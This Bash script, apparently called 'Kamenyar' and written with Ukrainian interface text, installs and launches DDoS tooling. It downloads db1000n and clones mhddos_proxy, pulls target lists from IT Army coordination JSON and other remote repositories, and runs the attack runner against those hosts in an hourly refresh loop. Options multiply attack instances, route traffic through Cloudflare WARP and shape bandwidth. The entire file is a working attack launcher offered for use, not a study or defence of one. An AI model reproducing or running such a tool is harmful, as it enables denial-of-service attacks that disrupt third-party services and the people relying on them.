#!/bin/bash
set -e
set -u
set -o pipefail

export opt_gotop="off"
export opt_type="normal"
export opt_shaper="off"
export opt_cloudflare="off"
export opt_debug="off"
export opt_db1000n="off"
export opt_recreate="off"
export opt_uninstall="off"
export args_to_pass=""
export opt_skip_dependencies="off"
while [[ $# -gt 0 ]]
do
    case $1 in
        -g | --gotop ) export opt_gotop="on"; shift ;;
        -n | --normal ) export opt_type="normal"; shift ;;
        -f | --full ) export opt_type="full"; shift ;;
        -e | --enormous ) export opt_type="enormous"; shift ;;
        -s | --shape ) export opt_shaper="on"; export shape_limit="$(($2*1024))"; shift 2 ;;
        -c | --cloudflare ) export opt_cloudflare="on"; shift ;;
        -d | --db1000n ) export opt_db1000n="on"; shift ;;
        -w | --debug ) export opt_debug="on"; shift ;;
        -r | --recreate ) export opt_recreate="on"; shift ;;
        -u | --uninstall ) export opt_uninstall="on"; shift ;;
        --skip-dependency-version ) export opt_skip_dependencies="on"; shift ;;
        *   ) export args_to_pass+=" $1"; shift ;; #pass all unrecognized arguments to mhddos_proxy
    esac
done

if [[ "$opt_debug" == "on" ]]
then
    set -x
fi

###############################################################################
# Most basic setup here
###############################################################################
export script_path="$HOME/multiddos_ii"

if [[ $opt_recreate == "on" ]]
then
    rm -rf "$script_path"
fi
if [[ $opt_uninstall == "on" ]]
then
    rm -rf "$script_path"
    exit 0
fi

###############################################################################
# Put links here
###############################################################################
export link_gotop_x32="https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_386.tgz"
export link_gotop_x64="https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.tgz"
export link_db1000n_x32="https://github.com/Arriven/db1000n/releases/latest/download/db1000n_linux_386.tar.gz"
export link_db1000n_x64="https://github.com/Arriven/db1000n/releases/latest/download/db1000n_linux_amd64.tar.gz"
export link_jq_x32="https://github.com/stedolan/jq/releases/download/jq-1.6/jq-linux32"
export link_jq_x64="https://github.com/stedolan/jq/releases/download/jq-1.6/jq-linux64"
export link_wondershaper="https://github.com/magnific0/wondershaper.git"
export link_tmux_x64="https://github.com/mosajjal/binary-tools/raw/master/x64/tmux"
export link_mhddos_proxy="https://github.com/LordWarWar/mhddos_proxy.git"
export link_pip="https://bootstrap.pypa.io/get-pip.py"
export link_cf_centos8="https://pkg.cloudflareclient.com/cloudflare-release-el8.rpm"
export link_shtools="ftp://ftp.gnu.org/gnu/shtool/shtool-2.0.8.tar.gz"
# Array with targetlists went to get_targets()
# Bash does not support array exporting
export link_itarmy_json="https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json"
# Array with paths went to get_targets()
# bash does not support array exporting
export helper_link_git="https://git--scm-com.translate.goog/download/linux?_x_tr_sl=en&_x_tr_tl=uk&_x_tr_hl=uk&_x_tr_pto=wapp"
export helper_link_python="https://freehost.com.ua/ukr/faq/articles/kak-ustanovit-python-na-linux/"
export link_banner="https://raw.githubusercontent.com/ahovdryk/aio_reaper/main/banner"

###############################################################################
# Put strings here
###############################################################################

export str_ok="OK"
export str_done="Виконано"
export str_downloading="Завантажую"
export str_probing="Перевіряю наявність"
export str_version="2.0.6 alpha"
export str_motto="Лупайте сю скалу!"
export str_name="Каменяр"
export str_found="знайдено."
export str_startup="Стартує $str_name"
export str_notfound="не знайдено"
export str_fatal="Продовження роботи неможливе."
export str_need_root="Потрібні права адміністратора"
export str_instructions="Інструкції по встановленню ви зможете знайти тут:"
export str_press_any_key="Натисніть Ентер [⏎] для завершення..."
export str_dir_create_failed="Не вдалося створити підкаталог в каталозі користувача."
export str_getting_targets="Отримую список цілей"
export str_targets_got="Цілей отримано:"
export str_targets_prepare="Підготовка цілей"
export str_all_targets="Всього отримано цілей:"
export str_targets_uniq="Всього унікальних цілей:"
export str_swap_required="Недостатньо пам'яті, спробуємо створити своп. ${str_need_root}"
export str_trying_install="Спроба встановити за допомогою системного пакетного менеджера. ${str_need_root}."
export str_cf_no_go="Cloudflare WARP не підтримується на цій системі. Вимкнено."
export str_venv_creating="Створюємо віртуальне оточення Python..."
export str_shape="Запускаю шейпер."
export str_no_tmux="tmux не знайдено в вашій системі. Запуск gotop недоцільний. Вимкнено."
export str_start_cleanup="Починаємо очистку після роботи..."
export str_cleaning="Зупиняю роботу"
export str_venv_failed="Не вдалося створити віртуальне оточення Пітону."
str_tmux_x32=$(cat <<-END
Нажаль tmux ніхто не збирає для 32-бітних систем в якості самодостатньої програми.
Для використання всіх функцій скрипту вам доведеться встановити його самостійно.
END
)
export str_tmux_x32
str_running_as_root=$(cat <<-END
Скрипт визначив, що його запущено з адміністративними правами.
Якщо ви не використовуєте шейпер, то це не потрібно, навіть шкідливо.
Подумайте над тим, щоби запустити без рута/sudo.
END
)
export str_running_as_root
str_end=$(cat <<-END
Прибирання завершено. Дякую за ваш внесок.
Нетерпляче чекаю вашого повернення.
END
)
export str_end
###############################################################################
# Here comes execution variables
###############################################################################
os_bits=$(getconf LONG_BIT)
if [ "$os_bits" != "64" ]
then
    os_bits="32"
fi
export os_bits

internet_interface=$(ip -o -4 route show to default | awk '{print $5}')
export internet_interface
export script_jq="null"
export script_tmux="null"
export script_gotop="null"

export RED_TEXT='\033[0;31m'
export NORM_TEXT='\033[0m'

###############################################################################
# Main script flow
###############################################################################

function main()
{
printf "%s %s...\n" "$str_startup" "$str_version"
###############################################################################
# Checking for write permissions to user folder
mkdir -p "$script_path" > /dev/null 2>&1
if [[ ! -d "$script_path" ]]
then
    print_error "$str_dir_create_failed"
    print_error "$str_fatal"
    echo -ne '\007'
    printf "%s\n" "$str_press_any_key"
    read -r
    exit 0
fi
cd "$script_path"
mkdir -p "$script_path/bin" > /dev/null 2>&1
mkdir -p "$script_path/targets" > /dev/null 2>&1
###############################################################################
printf "%s\n" "$str_motto"
###############################################################################
# Bound a param variable here.


local plat_tool="$script_path/bin/shtool-2.0.8/sh.platform"
local output_path="$script_path/bin/shtools.tar.gz"
local shtools_path="$script_path/bin/shtool-2.0.8/"
# Wondering why we need --disable-epsv? Ask Free Software Foundation
# They have had this bug in their software for ages.
while [[ ! -f $plat_tool ]]
do
    curl -s -L --retry 10 --output "$output_path" --url $link_shtools --disable-epsv > /dev/null 2>&1
    tar -xzf "$output_path" -C "$script_path/bin/" > /dev/null 2>&1
    rm -f "$output_path" > /dev/null 2>&1
done


if [[ ! -f "$plat_tool" ]]
    then
    # TODO: Download failed string
    print_error "${RED_TEXT}shtool download failed${NORM_TEXT}"
    os_arch="null"
    os_dist="null"
    os_version="null"
    os_version_major="null"
    os_family="null"
    os_kernel="null"
fi
local plat_output
cd "$shtools_path"
plat_output=$(bash "$plat_tool" -v -F "%[at] %{sp} %[st]")
cd "$script_path"
local rest=$plat_output
os_arch="${rest%% *}"; rest="${rest#* }"
os_dist="${rest%% *}"; rest="${rest#* }"
os_version="${rest%% *}"; rest="${rest#* }"
os_family="${rest%% *}"; rest="${rest#* }"
os_kernel="${rest%% *}"
os_kernel="${os_kernel///}"
os_version_major="${os_version%.*}"

# TODO: Make strings, check the variables!
printf "OS:\t%s\tDistrib:\t%s\tVersion:\t%s\n" "$os_family" "$os_dist" "$os_version"
printf "Arch:\t%s\tKernel:\t%s\n" "$os_arch" "$os_kernel"
###############################################################################
# Disencourage to use root!
if [[ "$EUID" == 0 ]]
then
    echo -ne '\007'
    print_error "${RED_TEXT}$str_running_as_root${NORM_TEXT}"
fi

###############################################################################
# Checking for write permissions to user folder
mkdir -p "$script_path" > /dev/null 2>&1
if [[ ! -d "$script_path" ]]
then
    print_error "\n$str_dir_create_failed"
    print_error "$str_fatal"
    echo -ne '\007'
    printf "%s\n" "$str_press_any_key"
    read -r
    exit 0
fi
cd "$script_path"
mkdir -p "$script_path/bin" > /dev/null 2>&1
mkdir -p "$script_path/targets" > /dev/null 2>&1
###############################################################################
# Checking if we have python and git
printf "%s Git... " "$str_probing"
if ! command -v git &> /dev/null
then
    printf "\n%s\n" "$str_notfound"
    echo -ne '\007'
    printf "%s\n" "$str_trying_install"
    try_install "git"
    if ! command -v git &> /dev/null
    then
        print_error "Git $str_notfound\n $str_fatal"
        echo -ne '\007'
        print_error "$str_instructions\n$helper_link_git"
        printf "%s\n" "$str_press_any_key"
        read -r
        exit 0
    fi
else
    printf "%s\n" "$str_found"
fi
###############################################################################
printf "%s Python 3... " "$str_probing"
if ! command -v python3 &> /dev/null
then
    print_error "\nPython $str_notfound\n $str_fatal"
    echo -ne '\007'
    print_error "$str_instructions\n$helper_link_python"
    printf "%s\n" "$str_press_any_key"
    read -r
    exit 0
else
    printf "%s\n" "$str_found"
fi
###############################################################################
# We have the python. Now we need to ensure pip
# We know the major version of Python. It's 3.
# Required version is 3.3+ or we should handle the venv stuff
# From version 3.4 under normal circumstances we automatically have pip
python_commands='import sys; version=sys.version_info[:3]; print("{1}".format(*version))'
python_subversion=$(python3 -c "$python_commands")
pip_output=$(
python3 - <<EOF
try:
    import pip;
    print("Pip installed!")
except Exception:
    print("Pip failed!")
EOF
)

if [[ "$pip_output" == "Pip installed!" ]]
then
    # py_havepip="true"
    true
else
    # Pip URL is here for a reason. It's dynamic.
    if [[ $python_subversion -lt 7 ]]
    then
        link_getpip="https://bootstrap.pypa.io/pip/3.$python_subversion/get-pip.py"
    else
        link_getpip="https://bootstrap.pypa.io/get-pip.py"
    fi
    curl -s -L --retry 10 --output "$script_path/get_pip.py" --url "$link_getpip"
    python3 "$script_path/get_pip.py" --user

fi
###############################################################################
# Checking if we have venv
# We gonna use virtualenv instead of venv if local python does not have venv
printf "%s...\n" "$str_venv_creating"
venv_output=$(
python3 - << EOF
try:
    import venv;
    print("venv installed!")
except Exception:
    print("venv failed!")
EOF
)
if [[ $venv_output == "venv installed!" ]]
then
    export py_venv="python3 -m venv"
    $py_venv "$script_path/venv" || venv_output="venv failed!"
fi
if [[ "$venv_output" == "venv failed!" ]]
then
    have_venv=$(
python3 - <<EOF
try:
    import virtualenv;
    print("virtualenv found!")
except Exception:
    print("virtualenv failed!")
EOF
)
    if [[ $have_venv == "virtualenv failed!" ]]
    then
        python3 -m pip install virtualenv
    fi
    export py_venv="python3 -m virtualenv"
    $py_venv "$script_path/venv" || export venv_output="fail"
fi
if [[ $venv_output == "fail" ]]
then
    printf "%s\n%s\n" "$str_venv_failed" "$str_fatal"
    exit
fi

###############################################################################
# Checking if jq installed and grabbing a local copy if not
printf "%s jq " "$str_probing"
if ! command -v jq &> /dev/null
then
    # We have a local copy, use that
    if [[ -f "$script_path/bin/jq" ]]
    then
        script_jq="$script_path/bin/jq"
        export script_jq
        printf "%s\n" "$str_found"
    fi
    # We don't have a local copy.
    if [[ "$script_jq" == "null" ]]
    then
        printf "%s\n" "$str_notfound"
        printf "%s jq " "$str_downloading"
        if [[ $os_bits == "64" ]]
        then
            download_link=$link_jq_x64
        fi
        if [[ $os_bits == "32" ]]
        then
            download_link=$link_jq_x32
        fi
        curl -s -L --retry 10 --output "$script_path/bin/jq" --url $download_link
        chmod +x "$script_path/bin/jq"
        script_jq="$script_path/bin/jq"
        export script_jq
        printf "%s\n" "$str_ok"
    fi
else
    # System jq found
    script_jq="jq"
    export script_jq
    printf "%s\n" "$str_found"
fi

###############################################################################
# Checking for tmux
printf "%s tmux... " "$str_probing"
if ! command -v tmux &> /dev/null
then
    if [[ -f "$script_path/bin/tmux" ]]
    then
        script_tmux="$script_path/bin/tmux"
        export script_tmux
        printf "%s\n" "$str_found"
    fi
    if [[ "$script_tmux" == "null" ]]
    then
        if [[ $os_bits == "64" ]]
        then
            curl -s -L --retry 10 --output "$script_path/bin/tmux" --url $link_tmux_x64
            chmod +x "$script_path/bin/tmux"
            script_tmux="$script_path/bin/tmux"
            printf "%s\n" "$str_ok"
        fi
        if [[ $os_bits == "32" ]]
        then
            printf "\n %s" "$str_tmux_x32\n"
            script_tmux="null"
        fi
    fi
else
    script_tmux="tmux"
    export script_tmux
    printf "%s\n" "$str_found"
fi

###############################################################################
# Checking for gotop
if [[ $script_tmux == "null" ]]
then
    opt_gotop="off"
    printf "%s\n" "$str_no_tmux"
else
    printf "%s gotop... " "$str_probing"
    if ! command -v gotop &> /dev/null
    then

        if [[ -s "$script_path/bin/gotop" ]]
        then
            script_gotop="$script_path/bin/gotop"
            export script_gotop
            printf "%s\n" "$str_ok"
        fi
        if [[ "$script_gotop" == "null" ]]
        then
            printf "%s\n" "$str_notfound"
            printf "%s gotop... " "$str_downloading"
            if [[ $os_bits == "64" ]]
            then
                download_link=$link_gotop_x64
            fi
            if [[ $os_bits == "32" ]]
            then
                download_link=$link_gotop_x32
            fi
            while [[ ! -s "$script_path/bin/gotop.tgz" ]]
            do
                curl -s -L --retry 10 --output "$script_path/bin/gotop.tgz" --url $download_link
            done
            tar -xzf "$script_path/bin/gotop.tgz" -C "$script_path/bin/"
            rm -f "$script_path/bin/gotop.tgz"
            chmod +x "$script_path/bin/gotop"
            script_gotop="$script_path/bin/gotop"
            export script_gotop
            printf "%s\n" "$str_ok"
        fi
    else
        script_gotop="gotop"
        export script_gotop
        printf "%s\n" "$str_found"
    fi
fi

###############################################################################
# Trying to create a swap uf low on memory
if [[ $(swapon --noheadings --bytes | cut -d " " -f3) == "" ]]; then
    export swap_failed="false"
    printf "%s\n%s.\n" "$str_swap_required" "$str_need_root"
    sudo fallocate -l 1G /swp || swap_failed="true"
    sudo chmod 600 /swp || swap_failed="true"
    sudo mkswap /swp || swap_failed="true"
    sudo swapon /swp || swap_failed="true"
    if [[ $swap_failed == "true" ]]
    then
        # TODO: String here
        echo "Swap creation failed"
    fi
fi

###############################################################################
# Downloading wondershaper if we didn't yet
if [[ "$opt_shaper" == "on" ]]
then
    printf "%s wondershaper... " "$str_probing"
    script_wondershaper="$script_path/bin/wondershaper/wondershaper"
    export script_wondershaper
    if [[ ! -f $script_path/bin/wondershaper/wondershaper ]]
    then
        printf "%s\n" "$str_notfound"
        printf "%s wondershaper... " "$str_downloading"
        cd "$script_path/bin"
        git clone https://github.com/magnific0/wondershaper.git > /dev/null 2>&1
        printf "\t [OK]\n"
        chmod +x "$script_wondershaper"
        cd "$script_path"
    fi
    printf "%s %s\n" "$str_shape" "$str_need_root"
    sudo "$script_wondershaper" -a "$internet_interface" -u "$shape_limit" -d "$shape_limit"
fi

###############################################################################
# Downloading db1000n if we didn't yet
if [[ "$opt_db1000n" == "on" ]]
then
    if [[ ! -f "$script_path/bin/db1000n" ]]
    then
        if [[ "$os_bits" == "32" ]]
        then
            download_link=$link_db1000n_x32
        fi
        if [[ "$os_bits" == "64" ]]
        then
            download_link=$link_db1000n_x64
        fi
        curl -s -L --retry 10  --output "$script_path/bin/db1000n.tar.gz" --url $download_link
        tar -xzf "$script_path/bin/db1000n.tar.gz" -C "$script_path/bin/"
        rm -f "$script_path/bin/db1000n.tar.gz"
        chmod +x "$script_path/bin/db1000n"
    else
        if [[ -f "$script_path/bin/db1000n.old" ]]
        then
            rm -f "$script_path/bin/db1000n.old"
        fi
        mv "$script_path/bin/db1000n" "$script_path/bin/db1000n.old"
        if [[ "$os_bits" == "32" ]]
        then
            download_link=$link_db1000n_x32
        fi
        if [[ "$os_bits" == "64" ]]
        then
            download_link=$link_db1000n_x64
        fi
        curl -s -L --retry 10  --output "$script_path/bin/db1000n.tar.gz" --url $download_link
        tar -xzf "$script_path/bin/db1000n.tar.gz" -C "$script_path/bin/"
        rm -f "$script_path/bin/db1000n.tar.gz"
        chmod +x "$script_path/bin/db1000n"
    fi
    export script_db1000n="$script_path/bin/db1000n"
fi

###############################################################################
# Getting cloudflare-warp
cf_good_to_go="false"
cf_installed="false"
if command -v warp-cli > /dev/null 2>&1
then
    cf_installed="true"
    cf_good_to_go="true"
fi
if [[ "$opt_cloudflare" == "on" ]]
then
    printf "%s cloudflare-warp... " "$str_probing"
    if [[ ("$cf_installed" == "false") && ("$os_bits" == 64) ]]
    then
        if [[ "$os_dist" == "CentOS" || $os_dist == "centos" ]]
        then
            if [[ "$os_version_major" == "8" ]]
            then
                cf_good_to_go="true"
                sudo rpm -ivh "$link_cf_centos8"
                sudo yum update
                sudo yum -y install cloudflare-warp
                yes | warp-cli register || true
            else
                cf_good_to_go="false"
            fi
        fi
        if [[ "$os_dist" == "Ubuntu" && $os_version_major -ge 16 ]]
        then
            cf_good_to_go="true"
            local gpg="/usr/share/keyrings/cloudflare-warp-archive-keyring.gpg"
            curl -s https://pkg.cloudflareclient.com/pubkey.gpg \
                    | sudo gpg --yes --dearmor --output $gpg
            echo "deb [arch=amd64 signed-by=$gpg] https://pkg.cloudflareclient.com/ $(lsb_release -cs) main" \
                    | sudo tee /etc/apt/sources.list.d/cloudflare-client.list
            sudo apt update
            sudo apt -y install cloudflare-warp
            yes | warp-cli register || true
        fi
        if [[ "$os_dist" == "Debian" && $os_version_major -ge 9 ]]
        then
            cf_good_to_go="true"
            local gpg="/usr/share/keyrings/cloudflare-warp-archive-keyring.gpg"
            curl -s https://pkg.cloudflareclient.com/pubkey.gpg \
                    | sudo gpg --yes --dearmor --output $gpg
            echo "deb [arch=amd64 signed-by=$gpg] https://pkg.cloudflareclient.com/ $(lsb_release -cs) main" \
                    | sudo tee /etc/apt/sources.list.d/cloudflare-client.list
            sudo apt update
            sudo apt -y install cloudflare-warp
            yes | warp-cli register || true
        fi
    fi
    if ! command -v warp-cli > /dev/null 2>&1
    then
        cf_good_to_go="false"
    fi
    if [[ "$cf_good_to_go" == "true" ]]
    then
        printf "%s\n" "$str_found"
    else
        print_error "$str_cf_no_go\n"
        opt_cloudflare="off"
    fi
fi
###############################################################################
# If we don't have venv
create_autobash
if [[ ! -f "$script_path/venv/bin/activate" ]]
then
    # We create one
    printf "%s\t" "$str_venv_creating"
    $py_venv "$script_path/venv"
    printf "%s\n" "$str_ok"
fi


if [[ "$opt_gotop" == "on" ]]
then
    if [ $script_tmux != "null" ]
    then
        # tmux mouse support
        # kill our sessions.
        $script_tmux list-sessions \
                | grep multidd \
                | awk 'BEGIN{FS=":"}{print $1}' \
                | xargs -n 1 $script_tmux kill-session -t || true > /dev/null 2>&1
        grep -qxF 'set -g mouse on' ~/.tmux.conf || echo 'set -g mouse on' >> ~/.tmux.conf
        $script_tmux new-session -s multidd -d "$script_gotop -sc solarized"
        $script_tmux split-window -h -l 80 "bash $script_path/auto_bash.sh"
        $script_tmux attach-session -t multidd
    else
        printf "%s\n" "$str_no_tmux"
        bash "$script_path/auto_bash.sh"
    fi
else
    bash "$script_path/auto_bash.sh"
fi

###############################################################################

cleanup
}
###############################################################################
# Functions
###############################################################################
function get_targets () {
    declare -a json_itarmy_paths=(
    ".jobs[].args.packet.payload.data.path"
    ".jobs[].args.connection.args.address"
    )
    declare -a link_targetlist_array=(
    "https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/all.txt"
    )
    printf "%s\n" "$str_getting_targets"
    if [ -d "$script_path/targets" ]
    then
        rm -rf "$script_path/targets" > /dev/null 2>&1
        mkdir -p "$script_path/targets/"
    fi
    cd "$script_path"

    local targets_got=0
    #####
    json=$(curl -s --retry 10 -L --url "$link_itarmy_json") > /dev/null 2>&1
    while [[ $targets_got == 0 ]]
    do
        local num=1
        for path in "${json_itarmy_paths[@]}"
        do
            touch "$script_path/targets/list$num.txt"
            lines=$(echo "$json" | $script_jq -r "$path" | sed '/null/d')
            if [[ $path == ".jobs[].args.connection.args.address" ]]
            then
                touch "$script_path/targets/list$num.txt"
                for line in $lines
                do
                    local output
                    output="tcp://$line"
                    echo "$output" >> "$script_path/targets/list$num.txt"
                done
            else
                echo "$lines" >> "$script_path/targets/list$num.txt"
            fi
            targets_got=$(wc -l < "$script_path/targets/list$num.txt")
            printf "%s %s\n" "$str_targets_got" "$targets_got"
            num=$((num+1))
        done
    done
    rm -f "$script_path/targets/db1000n.json" > /dev/null 2>&1

    for file in "$script_path"/targets/*.txt
    do
        sed -i '/^[[:space:]]*$/d' "$file"
        cat "$file" >> "$script_path/targets/itarmy.list"
    done
    #####
    if [[ $opt_type != "normal" ]]
    then
        for list in "${link_targetlist_array[@]}"
        do
            curl -s -X GET --url "$list" --output "$script_path/targets/list$num.txt"
            targets_got=$(wc -l < "$script_path/targets/list$num.txt")
            printf "%s %s\n" "$str_targets_got" "$targets_got"
            num=$((num+1))
        done

        printf "%s...\n" "$str_targets_prepare"
        #sed -i '/^[[:space:]]*$/d' "$script_path/targets/*.txt"
        for file in "$script_path"/targets/*.txt
        do
            sed -i '/^[[:space:]]*$/d' "$file"
        done

        for file in "$script_path"/targets/*.txt
        do
            cat "$file" >> "$script_path/targets/_targets.txt"
            rm -f "$file"
        done
        lines=$(cat "$script_path/targets/_targets.txt")
        rm -f "$script_path/targets/_targets.txt"
        for line in $lines
        do
            if [[ $line == "http"* ]] || [[ $line == "tcp://"* ]]
            then
                echo "$line" >> "$script_path/targets/all_targets.txt"
            fi
        done
        local total_targets
        total_targets=$(wc -l < "$script_path/targets/all_targets.txt")
        printf "%s %s.\n" "$str_all_targets" "$total_targets"
        sort < "$script_path/targets/all_targets.txt" \
            | uniq \
            | sort -R > "$script_path/targets/uniq_targets.txt"
        rm -f "$script_path/targets/all_targets.txt"
        local uniq_targets
        uniq_targets=$(wc -l < "$script_path/targets/uniq_targets.txt")
        printf "%s %s. \n" "$str_targets_uniq" "$uniq_targets"
    else
        local total_targets
        total_targets=$(wc -l < "$script_path/targets/itarmy.list")
        printf "%s %s.\n" "$str_all_targets" "$total_targets"
        sort < "$script_path/targets/itarmy.list" \
            | uniq \
            | sort -R > "$script_path/targets/uniq_targets.txt"
        rm -f "$script_path/targets/itarmy.list"
        local uniq_targets
        uniq_targets=$(wc -l < "$script_path/targets/uniq_targets.txt")
        printf "%s %s. \n" "$str_targets_uniq" "$uniq_targets"
        mv -f "$script_path/targets/uniq_targets.txt" "$script_path/targets/itarmy.list"
    fi
}
export -f get_targets
###############################################################################
# Kill process by path
###############################################################################
function pathkill()
{
# read this BEFORE fixing:https://www.baeldung.com/linux/reading-output-into-array
    local path="$*"
    #shellcheck disable=2009
    # pgrep does not work with python scripts in desired way
    IFS=$'\n' read -r -d '' -a pids  < <(ps aux | grep "$path" | awk '{print $2}' && printf '\0')
    for pid in $pids
    do
        kill -9 "$pid" > /dev/null 2>&1
    done
}
export -f pathkill
###############################################################################
# Check if process is running
###############################################################################
function proc_check()
{
    local path="$*"
    #shellcheck disable=2009
    # pgrep does not work with python scripts in desired way
    IFS=$'\n' read -r -d '' -a pids  < <(ps aux | grep "$path" | awk '{print $2}' && printf '\0')
    pids_num=${#pids[@]}
    echo "$pids_num"
}
export -f proc_check
###############################################################################
# Cleanup, disconnect, etc...
###############################################################################
function cleanup() {
    printf "%s\n" "$str_start_cleanup"
    printf "%s mhddos_proxy: " "$str_cleaning"
    pkill -f "$script_path/mhddos_proxy/runner.py" || true
    rm -rf "$script_path/mhddos_proxy" || true
    printf "%s\n" "$str_done"
    if [ "$opt_shaper" == "on" ]
    then
        printf "%s wondershaper: " "$str_cleaning"
        sudo "$script_wondershaper" -c -a "$internet_interface" || true
        printf "%s\n" "$str_done"
    fi
    if [ "$opt_cloudflare" == "on" ]
    then
        printf "%s Cloudflare Warp: " "$str_cleaning"
        warp-cli disconnect || true
    fi
    if [[ $opt_db1000n == "on" ]]
    then
        printf "%s db1000n: " "$str_cleaning"
        pkill -f "$script_db1000n" || true
        printf "%s\n" "$str_done"
    fi
    if [ $opt_gotop == "on" ]
    then
        printf "%s tmux: " "$str_cleaning"
        $script_tmux list-sessions \
            | grep multidd \
            | awk 'BEGIN{FS=":"}{print $1}' \
            | xargs -n 1 $script_tmux kill-session -t || true > /dev/null 2>&1
        printf "%s\n" "$str_done"
    fi

    printf "%s\n" "$str_end"
}
export cleanup
###############################################################################
# If we want to try to install something
###############################################################################
function try_install() {
    if command -v apt-get &> /dev/null
    then
        sudo apt-get -y install "$1"
    elif command -v yum &> /dev/null
    then
        sudo yum install "$1"
    elif command -v dnf &> /dev/null
    then
        sudo dnf install "$1"
    elif command -v pacman &> /dev/null
    then
        sudo pacman -S "$1"
    elif command -v zypper &> /dev/null
    then
        sudo zypper install "$1"
    elif command -v urpmi &> /dev/null
    then
        sudo urpmi "$1"
    elif command -v nix-env &> /dev/null
    then
        sudo nix-env -i "$1"
    elif command -v pkg &> /dev/null
    then
        sudo pkg install "$1"
    elif command -v pkgutil &> /dev/null
    then
        sudo pkgutil -i "$1"
    elif command -v pkg_add &> /dev/null
    then
        sudo pkg_add "$1"
    elif command -v apk &> /dev/null
    then
        sudo apk add "$1"
    fi
}
export -f try_install
###############################################################################
#
###############################################################################
function print_error(){
    printf "%s\n" "$*" >&2
}
export -f print_error
###############################################################################
#
###############################################################################
function create_autobash()
{
cat > "$script_path/auto_bash.sh" << 'EOF'
#!/bin/bash
if [[ $opt_debug == "on" ]]
then
    set -x
fi
runner="$script_path/mhddos_proxy/runner.py"
if [[ $opt_cloudflare == "on" ]]
then
    warp-cli connect
    sleep 15s
fi

# Restart and update mhddos_proxy and targets every N minutes
while true; do
    #install mhddos_proxy
    cd "$script_path" || return
    get_targets
    script_banner=$(curl -s --retry 10 -L --url "$link_banner") > /dev/null 2>&1
    printf "%s\n" "$script_banner"

    rm -rf "$script_path/mhddos_proxy" > /dev/null 2>&1
    while [[ ! -d "$script_path/mhddos_proxy" ]]
    do
        git clone "$link_mhddos_proxy" > /dev/null 2>&1
    done
    cd "$script_path/mhddos_proxy" || return
    # shellcheck disable=1091
    source "$script_path/venv/bin/activate"
    python3 -m pip install --upgrade pip
    if [[ $opt_skip_dependencies == "on" ]]
    then
        skip_dependencies
        python3 -m pip install -r "$script_path/mhddos_proxy/new_req.txt"
    else
        python3 -m pip install -r "$script_path/mhddos_proxy/requirements.txt"
    fi
    if [[ $opt_db1000n == "on" ]]
    then
        $script_db1000n &
    fi
    if [[ "$opt_type" == "normal" ]]
    then
        python3 "$runner" -c "$script_path/targets/itarmy.list" $args_to_pass &
    elif [[ "$opt_type" == "full" ]]
    then
        python3 "$runner" -c "$script_path/targets/uniq_targets.txt" $args_to_pass &
    elif [[ "$opt_type" == "enormous" ]]
    then
        python3 "$runner" -c "$script_path/targets/uniq_targets.txt" $args_to_pass &
        sleep 30
        python3 "$runner" -c "$script_path/targets/uniq_targets.txt" $args_to_pass &
    fi
    minute=0
    still_alive=0
    wait_min=60
    while [[ $minute -lt $wait_min ]]
    do
        sleep 1m
        minute=$((minute+1))
        still_alive=$(proc_check "$runner")
        if [[ $still_alive == 0 ]]
        then
            break
        fi
    done
    pkill -f "$runner"
    if [[ $opt_db1000n == "on" ]]
    then
        pkill -f "$script_db1000n"
    fi
    deactivate
done
EOF
}
function skip_dependencies()
{
    local requirements
    requirements=$(wc -l < "$script_path/mhddos_proxy/requirements.txt")
    if [[ -f "$script_path/mhddos_proxy/new_req.txt" ]]
    then
        rm -f "$script_path/mhddos_proxy/requirements.txt"
    fi
    for line in $requirements
    do
        local temp
        temp=${line%==*}
        temp=${temp%>=*}
        temp >> "$script_path/mhddos_proxy/requirements.txt"
    done

}
export -f skip_dependencies
###############################################################################
trap cleanup INT
main "$@"; exit
